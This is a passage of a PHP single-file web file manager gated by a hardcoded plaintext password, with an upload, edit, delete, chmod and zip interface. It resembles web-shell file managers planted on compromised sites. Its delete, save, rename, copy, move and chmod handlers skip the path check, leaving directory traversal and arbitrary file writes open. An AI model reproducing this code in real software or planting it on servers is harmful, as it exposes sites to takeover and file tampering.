<?php
session_start();

$password = 'albayan12345';
$root_dir = __DIR__;

// Security: Prevent directory traversal
function secure_path($path, $root) {
    $real = realpath($root . '/' . ltrim($path, '/'));
    if ($real === false || strpos($real, $root) !== 0) {
        return $root;
    }
    return str_replace('\\', '/', $real);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    if ($_POST['password'] === $password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
    } else {
        $error = 'Password salah';
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (!isset($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>CYBER // File Manager</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>

        * { margin: 0; padding: 0; box-sizing: border-box; }

        :root {
            --bg: #030711;
            --panel: rgba(7, 15, 30, .78);
            --panel-2: rgba(10, 22, 42, .72);
            --line: rgba(65, 225, 255, .14);
            --cyan: #39e7ff;
            --blue: #4f7cff;
            --purple: #a855f7;
            --pink: #ff3ea5;
            --green: #35f0a0;
            --text: #dcecff;
            --muted: #7890ad;
            --danger: #ff5470;
            --shadow: 0 20px 70px rgba(0,0,0,.55);
        }

        html { background: var(--bg); }
        body {
            font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background:
                radial-gradient(circle at 15% 10%, rgba(57,231,255,.10), transparent 28%),
                radial-gradient(circle at 85% 20%, rgba(168,85,247,.12), transparent 30%),
                radial-gradient(circle at 50% 100%, rgba(79,124,255,.09), transparent 35%),
                linear-gradient(135deg, #02050d, #050b18 50%, #030711);
            color: var(--text);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            pointer-events: none;
            opacity: .22;
            background-image:
                linear-gradient(rgba(57,231,255,.045) 1px, transparent 1px),
                linear-gradient(90deg, rgba(57,231,255,.045) 1px, transparent 1px);
            background-size: 42px 42px;
            mask-image: linear-gradient(to bottom, black, transparent 90%);
            z-index: 0;
        }

        body::after {
            content: "";
            position: fixed;
            width: 420px;
            height: 420px;
            border-radius: 50%;
            left: -160px;
            bottom: -180px;
            background: rgba(57,231,255,.07);
            filter: blur(80px);
            pointer-events: none;
        }

        ::selection { background: rgba(57,231,255,.25); color: #fff; }

        ::-webkit-scrollbar { width: 7px; height: 7px; }
        ::-webkit-scrollbar-track { background: #030711; }
        ::-webkit-scrollbar-thumb { background: linear-gradient(var(--cyan), var(--purple)); border-radius: 20px; }

        /* LOGIN */
        .login-box {
            position: relative;
            z-index: 1;
            width: min(92%, 440px);
            padding: 46px 42px;
            border: 1px solid rgba(57,231,255,.18);
            border-radius: 26px;
            background: linear-gradient(145deg, rgba(8,20,39,.88), rgba(8,12,27,.78));
            backdrop-filter: blur(24px);
            box-shadow: 0 0 0 1px rgba(168,85,247,.04), 0 30px 100px rgba(0,0,0,.65), 0 0 70px rgba(57,231,255,.06);
            overflow: hidden;
        }

        .login-box::before {
            content: "";
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--cyan), var(--purple), transparent);
            box-shadow: 0 0 22px var(--cyan);
        }

        .login-box::after {
            content: "SYSTEM ONLINE";
            position: absolute;
            top: 15px;
            right: 18px;
            color: var(--green);
            font: 700 9px/1 ui-monospace, SFMono-Regular, Consolas, monospace;
            letter-spacing: 1.5px;
            opacity: .75;
        }

        .logo { text-align: center; margin-bottom: 32px; }
        .logo span {
            width: 78px;
            height: 78px;
            margin: 0 auto 18px;
            display: grid;
            place-items: center;
            border-radius: 22px;
            font-size: 38px;
            background: linear-gradient(145deg, rgba(57,231,255,.12), rgba(168,85,247,.16));
            border: 1px solid rgba(57,231,255,.22);
            box-shadow: inset 0 0 25px rgba(57,231,255,.06), 0 0 35px rgba(57,231,255,.08);
        }

        .logo h2 {
            font-size: 25px;
            font-weight: 800;
            letter-spacing: .5px;
            background: linear-gradient(90deg, #fff, var(--cyan), #b98cff);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .logo p { color: var(--muted); font-size: 12px; margin-top: 8px; letter-spacing: .8px; }

        input[type="password"] {
            width: 100%;
            padding: 15px 17px;
            border: 1px solid rgba(120,180,255,.16);
            border-radius: 13px;
            background: rgba(0,0,0,.28);
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: .25s;
        }

        input[type="password"]::placeholder { color: #536b86; }
        input[type="password"]:focus {
            border-color: rgba(57,231,255,.6);
            box-shadow: 0 0 0 3px rgba(57,231,255,.07), 0 0 30px rgba(57,231,255,.09);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(100deg, #157bff, #694cff 55%, #b43cff);
            color: #fff;
            border: 1px solid rgba(255,255,255,.12);
            border-radius: 13px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 750;
            letter-spacing: .3px;
            transition: .25s;
            margin-top: 9px;
            box-shadow: 0 10px 30px rgba(79,124,255,.18);
        }

        button:hover { transform: translateY(-2px); box-shadow: 0 14px 38px rgba(79,124,255,.30), 0 0 20px rgba(57,231,255,.08); }
        .error { color: #ff8c9d; text-align: center; margin-top: 16px; font-size: 12px; background: rgba(255,84,112,.08); border: 1px solid rgba(255,84,112,.16); padding: 11px; border-radius: 11px; }
        .hint { color: #506985; font-size: 11px; text-align: center; margin-top: 18px; }

        /* APP */
        .header {
            position: sticky;
            top: 0;
            z-index: 100;
            padding: 13px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            background: rgba(3,9,20,.82);
            backdrop-filter: blur(22px);
            border-bottom: 1px solid var(--line);
            box-shadow: 0 10px 35px rgba(0,0,0,.25);
        }

        .header h1 { font-size: 16px; font-weight: 800; display: flex; align-items: center; gap: 10px; letter-spacing: .3px; }
        .header h1 span { color: var(--cyan); text-shadow: 0 0 18px rgba(57,231,255,.35); }
        .header .status { font-size: 10px; opacity: .55; font-family: ui-monospace, monospace; color: #91a9c4; }
        .header .right { display: flex; align-items: center; gap: 12px; }
        .header a {
            color: #9edfff;
            text-decoration: none;
            font-size: 11px;
            padding: 7px 12px;
            border-radius: 9px;
            border: 1px solid rgba(57,231,255,.18);
            background: rgba(57,231,255,.04);
            transition: .25s;
        }
        .header a:hover { color: #fff; border-color: rgba(57,231,255,.5); background: rgba(57,231,255,.10); box-shadow: 0 0 20px rgba(57,231,255,.08); }

        .container { position: relative; z-index: 1; max-width: 1450px; margin: 0 auto; padding: 22px; }

        .message {
            padding: 11px 16px;
            border-radius: 11px;
            margin-bottom: 15px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideDown .3s ease;
        }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
        .message.success { background: rgba(53,240,160,.07); border: 1px solid rgba(53,240,160,.18); color: #75f5bd; }
        .message.error { background: rgba(255,84,112,.07); border: 1px solid rgba(255,84,112,.18); color: #ff9aaa; }

        .stats, .toolbar, .breadcrumb, .file-list, .editor {
            background: linear-gradient(145deg, rgba(8,20,39,.72), rgba(5,12,27,.68));
            border: 1px solid rgba(90,180,255,.10);
            box-shadow: 0 14px 50px rgba(0,0,0,.18);
            backdrop-filter: blur(15px);
        }

        .stats {
            display: flex; gap: 28px; padding: 12px 17px; border-radius: 13px; margin-bottom: 13px;
            font-size: 11px; flex-wrap: wrap;
        }
        .stats .stat { display: flex; align-items: center; gap: 7px; color: var(--muted); }
        .stats .stat strong { color: #cfe6ff; font-weight: 700; }

        .toolbar {
            display: flex; gap: 7px; flex-wrap: wrap; margin-bottom: 13px; padding: 10px 12px;
            border-radius: 13px; align-items: center;
        }
        .toolbar form { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
        .toolbar input[type="text"], .toolbar input[type="file"], .toolbar select {
            padding: 7px 11px; border: 1px solid rgba(110,190,255,.12); border-radius: 9px;
            background: rgba(0,0,0,.25); color: #cce5ff; font-size: 11px; outline: none; transition: .25s; min-width: 100px;
        }
        .toolbar input:focus { border-color: rgba(57,231,255,.55); box-shadow: 0 0 18px rgba(57,231,255,.06); }
        .toolbar button {
            width: auto; padding: 7px 12px; background: rgba(255,255,255,.035);
            border: 1px solid rgba(110,190,255,.12); border-radius: 9px; color: #a9bfd8;
            cursor: pointer; font-size: 11px; transition: .25s; margin-top: 0; box-shadow: none;
        }
        .toolbar button:hover { background: rgba(57,231,255,.08); border-color: rgba(57,231,255,.35); color: #fff; transform: translateY(-1px); }
        .toolbar .primary {
            background: linear-gradient(100deg, #116eff, #744cff); border: none; color: #fff;
            box-shadow: 0 6px 20px rgba(79,124,255,.20);
        }

        .breadcrumb {
            font-size: 11px; color: #526a84; padding: 9px 14px; border-radius: 11px; margin-bottom: 13px;
            word-break: break-all;
        }
        .breadcrumb a { color: #6edfff; text-decoration: none; transition: .2s; }
        .breadcrumb a:hover { color: #fff; text-shadow: 0 0 12px rgba(57,231,255,.5); }
        .breadcrumb .sep { color: #344a63; margin: 0 4px; }

        .file-list { border-radius: 14px; overflow: hidden; }
        table { width: 100%; border-collapse: collapse; }
        th {
            padding: 11px 15px; text-align: left; font-size: 9px; text-transform: uppercase;
            letter-spacing: 1px; color: #5d7692; font-weight: 800; border-bottom: 1px solid rgba(100,190,255,.10);
            background: rgba(0,0,0,.13);
        }
        td { padding: 9px 15px; border-bottom: 1px solid rgba(100,190,255,.055); font-size: 12px; vertical-align: middle; }
        tr { transition: .18s; }
        tr:hover td { background: rgba(57,231,255,.035); }
        .file-row .icon { font-size: 17px; margin-right: 9px; filter: drop-shadow(0 0 6px rgba(57,231,255,.12)); }
        .file-row .name { display: inline-flex; align-items: center; }
        .file-row .name a { color: #bcd2e8; text-decoration: none; transition: .2s; }
        .file-row .name a:hover { color: var(--cyan); text-shadow: 0 0 12px rgba(57,231,255,.28); }
        .file-row .dir a { font-weight: 700; color: #b18cff; }
        .file-row .dir a:hover { color: #d5c1ff; }
        .size-col { color: #67819c; font-size: 11px; font-family: ui-monospace, monospace; }
        .date-col { color: #58708a; font-size: 10px; }
        .perms-col { font-family: ui-monospace, monospace; font-size: 10px; color: #4e6680; }

        .actions { display: flex; gap: 4px; flex-wrap: wrap; align-items: center; }
        .actions button, .actions a {
            padding: 4px 9px; border: 1px solid transparent; border-radius: 7px; cursor: pointer;
            font-size: 10px; transition: .2s; text-decoration: none; display: inline-flex; align-items: center; gap: 4px;
            width: auto; margin: 0; box-shadow: none;
        }
        .actions .del { background: rgba(255,84,112,.07); color: #ff8799; border-color: rgba(255,84,112,.10); }
        .actions .del:hover { background: rgba(255,84,112,.16); border-color: rgba(255,84,112,.28); }
        .actions .edit-btn { background: rgba(79,124,255,.08); color: #81aaff; border-color: rgba(79,124,255,.13); }
        .actions .edit-btn:hover { background: rgba(79,124,255,.17); }
        .actions .preview-btn { background: rgba(53,240,160,.07); color: #70efb5; border-color: rgba(53,240,160,.12); }
        .actions .preview-btn:hover { background: rgba(53,240,160,.15); }
        .actions .copy-btn { background: rgba(255,200,75,.07); color: #ffd675; border-color: rgba(255,200,75,.12); }
        .actions .copy-btn:hover { background: rgba(255,200,75,.15); }
        .actions .chmod-btn { background: rgba(168,85,247,.08); color: #c99aff; border-color: rgba(168,85,247,.13); }
        .actions .chmod-btn:hover { background: rgba(168,85,247,.17); }

        .inline-form { display: inline-flex; gap: 4px; align-items: center; }
        .inline-form input {
            padding: 4px 7px; border: 1px solid rgba(110,190,255,.10); border-radius: 6px;
            background: rgba(0,0,0,.22); color: #bdd3e8; font-size: 10px; width: 70px; outline: none;
        }
        .inline-form input:focus { border-color: rgba(57,231,255,.4); }
        .inline-form button { padding: 4px 7px; border: 1px solid rgba(110,190,255,.10); border-radius: 6px; background: rgba(255,255,255,.03); color: #7891aa; cursor: pointer; font-size: 10px; transition: .2s; width: auto; margin: 0; box-shadow: none; }
        .inline-form button:hover { background: rgba(57,231,255,.08); color: #fff; }

        .editor { padding: 18px; border-radius: 14px; margin-bottom: 15px; }
        .editor h3 { font-size: 13px; font-weight: 600; margin-bottom: 11px; color: #91aac3; }
        .editor textarea {
            width: 100%; min-height: 420px; font-family: "Fira Code", "Cascadia Code", Consolas, monospace;
            font-size: 12px; line-height: 1.6; padding: 15px; border: 1px solid rgba(100,190,255,.10);
            border-radius: 10px; background: rgba(0,0,0,.35); color: #bfe4ff; resize: vertical; outline: none;
        }
        .editor textarea:focus { border-color: rgba(57,231,255,.4); box-shadow: inset 0 0 35px rgba(57,231,255,.025); }
        .editor .actions { margin-top: 11px; display: flex; gap: 9px; }
        .editor .actions button { padding: 9px 20px; border-radius: 9px; border: none; cursor: pointer; font-size: 12px; font-weight: 700; transition: .25s; width: auto; margin: 0; }
        .editor .actions .save { background: linear-gradient(100deg, #1176ff, #7b42ff); color: #fff; }
        .editor .actions .save:hover { transform: translateY(-1px); box-shadow: 0 10px 25px rgba(79,124,255,.2); }
        .editor .actions .cancel { background: rgba(255,255,255,.045); color: #7890a8; }

        .preview-box {
            background: rgba(0,0,0,.32); padding: 16px; border-radius: 10px;
            border: 1px solid rgba(100,190,255,.08); margin-bottom: 15px; max-height: 520px; overflow: auto;
            font-family: ui-monospace, monospace; font-size: 12px; line-height: 1.6; white-space: pre-wrap; word-break: break-word;
        }
        .preview-box .empty { color: #496079; text-align: center; padding: 40px; }

        .modal {
            display: none; position: fixed; inset: 0; width: 100%; height: 100%;
            background: rgba(0,3,10,.78); backdrop-filter: blur(13px); z-index: 1000; align-items: center; justify-content: center;
            padding: 20px;
        }
        .modal.active { display: flex; }
        .modal-content {
            position: relative; background: linear-gradient(145deg, #09162b, #050b18);
            border: 1px solid rgba(57,231,255,.16); padding: 25px; border-radius: 18px;
            width: 90%; max-width: 480px; max-height: 90vh; overflow-y: auto;
            box-shadow: 0 30px 100px rgba(0,0,0,.65), 0 0 40px rgba(57,231,255,.05);
        }
        .modal-content::before {
            content: ""; position: absolute; top: 0; left: 12%; right: 12%; height: 1px;
            background: linear-gradient(90deg, transparent, var(--cyan), transparent); box-shadow: 0 0 15px var(--cyan);
        }
        .modal-content h3 { font-size: 15px; margin-bottom: 14px; font-weight: 700; color: #d9ecff; }
        .modal-content input, .modal-content select {
            width: 100%; padding: 10px 12px; border: 1px solid rgba(100,190,255,.11); border-radius: 9px;
            background: rgba(0,0,0,.3); color: #c8e2fb; font-size: 12px; margin-bottom: 9px; outline: none;
        }
        .modal-content input:focus, .modal-content select:focus { border-color: rgba(57,231,255,.45); }
        .modal-content button { width: 100%; padding: 10px; border: none; border-radius: 9px; cursor: pointer; font-size: 12px; font-weight: 700; transition: .2s; margin-bottom: 6px; }
        .modal-content .confirm { background: linear-gradient(100deg, #1176ff, #7b42ff); color: white; }
        .modal-content .confirm:hover { transform: translateY(-1px); box-shadow: 0 10px 25px rgba(79,124,255,.2); }
        .modal-content .cancel { background: rgba(255,255,255,.045); color: #7890a8; }
        .modal-content .danger { background: rgba(255,84,112,.12); color: #ff91a1; }
        .modal-content .checkbox-group { display: flex; flex-wrap: wrap; gap: 6px; max-height: 200px; overflow-y: auto; margin: 9px 0; padding: 10px; background: rgba(0,0,0,.2); border-radius: 8px; }
        .modal-content .checkbox-group label { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #7891aa; cursor: pointer; padding: 3px 6px; border-radius: 5px; }
        .modal-content .checkbox-group label:hover { background: rgba(57,231,255,.05); color: #c7e7ff; }

        .empty-state { text-align: center; padding: 55px 20px; color: #466078; }
        .empty-state .icon { font-size: 44px; margin-bottom: 10px; display: block; filter: grayscale(.2); }
        .empty-state p { font-size: 12px; }
        .search-badge {
            background: rgba(57,231,255,.06); padding: 4px 10px; border-radius: 20px;
            font-size: 10px; color: #6edfff; display: inline-flex; align-items: center; gap: 6px;
            border: 1px solid rgba(57,231,255,.12);
        }
        .search-badge a { color: #6edfff; text-decoration: none; }

        @media (max-width: 768px) {
            .header { padding: 10px 14px; flex-wrap: wrap; gap: 8px; }
            .header h1 { font-size: 14px; }
            .header .right { margin-left: auto; }
            .header .right > .status { display: none; }
            .container { padding: 11px; }
            .toolbar { padding: 9px; }
            .toolbar form { width: 100%; }
            .toolbar input[type="text"] { width: 100% !important; }
            .toolbar input[type="file"] { width: calc(100% - 78px); min-width: 0; }
            td { padding: 8px 9px; font-size: 11px; }
            th { padding: 9px; }
            .actions { gap: 2px; }
            .actions button, .actions a { font-size: 9px; padding: 3px 6px; }
            .stats { gap: 10px; font-size: 10px; }
            .inline-form input { width: 55px; }
            .hide-mobile { display: none; }
            .login-box { padding: 40px 24px; }
        }

        @media print {
            .header, .toolbar, .breadcrumb, .actions, .stats { display: none; }
            body { background: white; color: black; }
            body::before, body::after { display: none; }
            .file-list { border: 1px solid #ddd; }
            th { background: #f5f5f5; color: #333; }
            td { border-color: #ddd; }
            tr:hover td { background: white; }
        }

        body { display:flex; align-items:center; justify-content:center; min-height:100vh; }

    </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">
                <span>📁</span>
                <h2>File Manager</h2>
                <p>Secure file management system</p>
            </div>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter password" required autofocus>
                <button type="submit" name="login">Access Dashboard</button>
            </form>
            <?php if (isset($error)) echo "<div class='error'>❌ $error</div>"; ?>
            <div class="hint">🔒 Session expires after 1 hour</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Session timeout 1 hour
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time'] > 3600)) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

function get_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function get_file_icon($name) {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'js' => '🟨', 'css' => '🎨', 'html' => '🌐',
        'json' => '📋', 'xml' => '📄', 'txt' => '📝', 'md' => '📖',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'svg' => '🖼️', 'pdf' => '📕', 'doc' => '📘', 'docx' => '📘',
        'xls' => '📊', 'xlsx' => '📊', 'zip' => '📦', 'rar' => '📦',
        'tar' => '📦', 'gz' => '📦', 'mp4' => '🎬', 'mp3' => '🎵',
        'wav' => '🎵', 'avi' => '🎬', 'mkv' => '🎬', 'exe' => '⚙️',
        'dll' => '⚙️', 'sh' => '🐚', 'py' => '🐍', 'rb' => '💎',
        'go' => '🐹', 'rs' => '🦀', 'c' => '⚡', 'cpp' => '⚡',
        'java' => '☕', 'sql' => '🗄️', 'log' => '📜'
    ];
    return $icons[$ext] ?? '📄';
}

function get_file_preview($path) {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $preview_exts = ['txt', 'md', 'json', 'xml', 'log', 'js', 'css', 'html', 'php', 'sql', 'py', 'rb', 'sh'];
    if (in_array($ext, $preview_exts) && filesize($path) < 50000) {
        return htmlspecialchars(file_get_contents($path));
    }
    return null;
}

function scan_dir($dir) {
    $items = [];
    if (!is_dir($dir)) return $items;
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $full_path = $dir . '/' . $file;
        $is_dir = is_dir($full_path);
        $size = $is_dir ? 0 : filesize($full_path);
        $items[] = [
            'name' => $file,
            'is_dir' => $is_dir,
            'size' => $size,
            'path' => $full_path,
            'modified' => date('Y-m-d H:i', filemtime($full_path)),
            'permissions' => substr(sprintf('%o', fileperms($full_path)), -4),
            'extension' => $is_dir ? 'folder' : strtolower(pathinfo($file, PATHINFO_EXTENSION))
        ];
    }
    usort($items, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function delete_directory($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = "$dir/$file";
        is_dir($path) ? delete_directory($path) : unlink($path);
    }
    return rmdir($dir);
}

function format_file_count($items) {
    $dirs = 0;
    $files = 0;
    foreach ($items as $item) {
        $item['is_dir'] ? $dirs++ : $files++;
    }
    return "$dirs folders, $files files";
}

function get_total_size($items) {
    $total = 0;
    foreach ($items as $item) {
        if (!$item['is_dir']) $total += $item['size'];
    }
    return get_size($total);
}

function search_files($dir, $query) {
    $results = [];
    if (!is_dir($dir)) return $results;
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $full = $dir . '/' . $file;
        if (stripos($file, $query) !== false) {
            $results[] = [
                'name' => $file,
                'path' => $full,
                'is_dir' => is_dir($full),
                'size' => is_dir($full) ? 0 : filesize($full)
            ];
        }
        if (is_dir($full) && $file[0] !== '.') {
            $results = array_merge($results, search_files($full, $query));
        }
    }
    return $results;
}

$current_dir = isset($_GET['dir']) ? secure_path($_GET['dir'], $root_dir) : $root_dir;
$rel_dir = str_replace($root_dir, '', $current_dir);
$rel_dir = ltrim($rel_dir, '/');

$message = '';
$error_msg = '';

// Handle actions
if (isset($_POST['mkdir'])) {
    $new_dir = $current_dir . '/' . preg_replace('/[^a-zA-Z0-9_\-\s]/', '', $_POST['mkdir']);
    if (!is_dir($new_dir)) {
        if (mkdir($new_dir, 0755)) {
            $message = '📁 Folder created';
        } else {
            $error_msg = '❌ Failed to create folder';
        }
    } else {
        $error_msg = '⚠️ Folder already exists';
    }
}

if (isset($_POST['delete_file']) && isset($_POST['confirm_delete'])) {
    $target = $current_dir . '/' . $_POST['delete_file'];
    if (!is_dir($target) && unlink($target)) {
        $message = '🗑️ File deleted';
    } else {
        $error_msg = '❌ Failed to delete file';
    }
}

if (isset($_POST['delete_dir']) && isset($_POST['confirm_delete'])) {
    $target = $current_dir . '/' . $_POST['delete_dir'];
    if (is_dir($target) && delete_directory($target)) {
        $message = '🗑️ Folder deleted';
    } else {
        $error_msg = '❌ Failed to delete folder';
    }
}

if (isset($_POST['rename']) && isset($_POST['rename_new'])) {
    $old = $current_dir . '/' . $_POST['rename_old'];
    $new = $current_dir . '/' . preg_replace('/[^a-zA-Z0-9_\-\s.]/', '', $_POST['rename_new']);
    if (file_exists($old) && !file_exists($new) && rename($old, $new)) {
        $message = '✏️ Renamed successfully';
    } else {
        $error_msg = '❌ Failed to rename';
    }
}

if (isset($_POST['save_file'])) {
    $file = $current_dir . '/' . $_POST['file_name'];
    if (file_put_contents($file, $_POST['file_content']) !== false) {
        $message = '💾 File saved';
    } else {
        $error_msg = '❌ Failed to save file';
    }
}

if (isset($_POST['create_file'])) {
    $filename = preg_replace('/[^a-zA-Z0-9_\-\s.]/', '', $_POST['filename']);
    $file = $current_dir . '/' . $filename;
    if (!file_exists($file)) {
        if (file_put_contents($file, '') !== false) {
            $message = '📄 File created';
        } else {
            $error_msg = '❌ Failed to create file';
        }
    } else {
        $error_msg = '⚠️ File already exists';
    }
}

if (isset($_POST['upload_file'])) {
    if (isset($_FILES['upload']) && $_FILES['upload']['error'] === 0) {
        $max_size = 100 * 1024 * 1024; // 100MB
        if ($_FILES['upload']['size'] > $max_size) {
            $error_msg = '❌ File too large (max 100MB)';
        } else {
            $remote = $current_dir . '/' . basename($_FILES['upload']['name']);
            if (!file_exists($remote) && move_uploaded_file($_FILES['upload']['tmp_name'], $remote)) {
                $message = '📤 File uploaded';
            } else {
                $error_msg = '❌ Upload failed';
            }
        }
    }
}

if (isset($_POST['copy_file'])) {
    $source = $current_dir . '/' . $_POST['copy_source'];
    $dest = $current_dir . '/' . preg_replace('/[^a-zA-Z0-9_\-\s.]/', '', $_POST['copy_dest']);
    if (file_exists($source) && !file_exists($dest) && copy($source, $dest)) {
        $message = '📋 File copied';
    } else {
        $error_msg = '❌ Failed to copy file';
    }
}

if (isset($_POST['move_file'])) {
    $source = $current_dir . '/' . $_POST['move_source'];
    $dest = $current_dir . '/' . preg_replace('/[^a-zA-Z0-9_\-\s.]/', '', $_POST['move_dest']);
    if (file_exists($source) && !file_exists($dest) && rename($source, $dest)) {
        $message = '📦 File moved';
    } else {
        $error_msg = '❌ Failed to move file';
    }
}

if (isset($_POST['chmod'])) {
    $target = $current_dir . '/' . $_POST['chmod_target'];
    $perms = intval($_POST['chmod_perms'], 8);
    if (file_exists($target) && chmod($target, $perms)) {
        $message = '🔐 Permissions updated';
    } else {
        $error_msg = '❌ Failed to update permissions';
    }
}

if (isset($_POST['extract_zip'])) {
    $zip_file = $current_dir . '/' . $_POST['extract_zip'];
    if (class_exists('ZipArchive') && file_exists($zip_file)) {
        $zip = new ZipArchive();
        if ($zip->open($zip_file) === true) {
            $extract_to = $current_dir . '/' . pathinfo($zip_file, PATHINFO_FILENAME);
            if (!is_dir($extract_to)) mkdir($extract_to, 0755);
            if ($zip->extractTo($extract_to)) {
                $message = '📦 ZIP extracted';
            } else {
                $error_msg = '❌ Failed to extract ZIP';
            }
            $zip->close();
        } else {
            $error_msg = '❌ Failed to open ZIP';
        }
    } else {
        $error_msg = '❌ ZIP extension not available or file not found';
    }
}

if (isset($_POST['create_zip'])) {
    $zip_name = preg_replace('/[^a-zA-Z0-9_\-\s.]/', '', $_POST['zip_name']);
    $zip_file = $current_dir . '/' . $zip_name . '.zip';
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zip_file, ZipArchive::CREATE) === true) {
            $files_to_zip = isset($_POST['zip_files']) ? $_POST['zip_files'] : [];
            foreach ($files_to_zip as $file) {
                $full = $current_dir . '/' . $file;
                if (file_exists($full)) {
                    if (is_dir($full)) {
                        $zip->addEmptyDir($file);
                    } else {
                        $zip->addFile($full, $file);
                    }
                }
            }
            $zip->close();
            $message = '📦 ZIP created';
        } else {
            $error_msg = '❌ Failed to create ZIP';
        }
    } else {
        $error_msg = '❌ ZIP extension not available';
    }
}

if (isset($_POST['search'])) {
    $search_query = trim($_POST['search_query']);
    if (strlen($search_query) > 0) {
        $_SESSION['search_results'] = search_files($current_dir, $search_query);
        $_SESSION['search_query'] = $search_query;
    }
}

if (isset($_GET['clear_search'])) {
    unset($_SESSION['search_results']);
    unset($_SESSION['search_query']);
}

$edit_file = '';
$preview_file = '';
if (isset($_GET['edit'])) {
    $edit_file = realpath($current_dir . '/' . $_GET['edit']);
    if (!$edit_file || strpos($edit_file, $root_dir) !== 0 || is_dir($edit_file)) {
        $edit_file = '';
    }
}

if (isset($_GET['preview'])) {
    $preview_file = realpath($current_dir . '/' . $_GET['preview']);
    if (!$preview_file || strpos($preview_file, $root_dir) !== 0 || is_dir($preview_file) || filesize($preview_file) > 100000) {
        $preview_file = '';
    }
}

$items = scan_dir($current_dir);
$show_search = isset($_SESSION['search_results']);
$search_results = $show_search ? $_SESSION['search_results'] : [];
$search_query = $_SESSION['search_query'] ?? '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>CYBER // File Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>

        * { margin: 0; padding: 0; box-sizing: border-box; }

        :root {
            --bg: #030711;
            --panel: rgba(7, 15, 30, .78);
            --panel-2: rgba(10, 22, 42, .72);
            --line: rgba(65, 225, 255, .14);
            --cyan: #39e7ff;
            --blue: #4f7cff;
            --purple: #a855f7;
            --pink: #ff3ea5;
            --green: #35f0a0;
            --text: #dcecff;
            --muted: #7890ad;
            --danger: #ff5470;
            --shadow: 0 20px 70px rgba(0,0,0,.55);
        }

        html { background: var(--bg); }
        body {
            font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background:
                radial-gradient(circle at 15% 10%, rgba(57,231,255,.10), transparent 28%),
                radial-gradient(circle at 85% 20%, rgba(168,85,247,.12), transparent 30%),
                radial-gradient(circle at 50% 100%, rgba(79,124,255,.09), transparent 35%),
                linear-gradient(135deg, #02050d, #050b18 50%, #030711);
            color: var(--text);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            pointer-events: none;
            opacity: .22;
            background-image:
                linear-gradient(rgba(57,231,255,.045) 1px, transparent 1px),
                linear-gradient(90deg, rgba(57,231,255,.045) 1px, transparent 1px);
            background-size: 42px 42px;
            mask-image: linear-gradient(to bottom, black, transparent 90%);
            z-index: 0;
        }

        body::after {
            content: "";
            position: fixed;
            width: 420px;
            height: 420px;
            border-radius: 50%;
            left: -160px;
            bottom: -180px;
            background: rgba(57,231,255,.07);
            filter: blur(80px);
            pointer-events: none;
        }

        ::selection { background: rgba(57,231,255,.25); color: #fff; }

        ::-webkit-scrollbar { width: 7px; height: 7px; }
        ::-webkit-scrollbar-track { background: #030711; }
        ::-webkit-scrollbar-thumb { background: linear-gradient(var(--cyan), var(--purple)); border-radius: 20px; }

        /* LOGIN */
        .login-box {
            position: relative;
            z-index: 1;
            width: min(92%, 440px);
            padding: 46px 42px;
            border: 1px solid rgba(57,231,255,.18);
            border-radius: 26px;
            background: linear-gradient(145deg, rgba(8,20,39,.88), rgba(8,12,27,.78));
            backdrop-filter: blur(24px);
            box-shadow: 0 0 0 1px rgba(168,85,247,.04), 0 30px 100px rgba(0,0,0,.65), 0 0 70px rgba(57,231,255,.06);
            overflow: hidden;
        }

        .login-box::before {
            content: "";
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--cyan), var(--purple), transparent);
            box-shadow: 0 0 22px var(--cyan);
        }

